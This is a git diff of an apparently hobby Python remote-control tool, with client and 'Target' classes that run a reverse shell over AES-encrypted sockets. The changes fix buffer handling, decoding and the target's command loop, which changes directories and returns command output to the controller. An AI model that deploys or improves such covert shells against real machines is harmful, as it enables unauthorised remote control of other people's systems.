@@ -25,7 +25,10 @@ class Machine:
         text_enc = connection.recv(self.buffer)
         cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
         text = cipher_aes.decrypt(text_enc)
-        return text.decode("utf-8")
+        try:
+            return text.decode("utf-8")
+        except UnicodeDecodeError:
+            return text
 
     def send_message_encryption_aes(self, connection, text_to_encrypt):
         if type(text_to_encrypt) == str:
@@ -85,9 +88,9 @@ class Client(Machine):
                 if len(str.encode(cmd)) > 0:
                     super().send_message_encryption_aes(self.s, cmd)
                     if self.buffer < 8192:
-                        self.buffer = self.buffer * 2
+                        self.buffer = int(self.buffer * 2)
                         client_response = super().recv_message_encryption_aes(self.s)
-                        self.buffer = self.buffer / 2
+                        self.buffer = int(self.buffer / 2)
                     else:
                         client_response = super().recv_message_encryption_aes(self.s)
                     print(client_response, end="")
@@ -208,9 +211,8 @@ class Target(Machine):
             self.quit()
 
     def reverse_shell_target(self):
-        data = ""
+        data = super().recv_message_encryption_aes(self.conn)
         while data != "quit":
-            data = super().recv_message_encryption_aes(self.conn)
             try:
                 if data[:2] == 'cd':
                     os.chdir(data[3:])
@@ -227,6 +229,7 @@ class Target(Machine):
                 if self.print:
                     print(error_msg)
                 super().send_message_encryption_aes(self.conn, error_msg)
+            data = super().recv_message_encryption_aes(self.conn)
         if self.print:
             print("Leaving Shell")
         super().send_message_encryption_aes(self.conn, "we are leaving the Shell prompt on target\n")
@@ -258,7 +261,7 @@ class Target(Machine):
 
     # define the buffer size
     def change_buffer_size(self):
-        self.buffer = int(self.conn.recv(self.buffer))
+        self.buffer = int(self.recv_message_encryption_aes(self.conn))
         if self.print:
             print("the buffer size is", self.buffer)
 
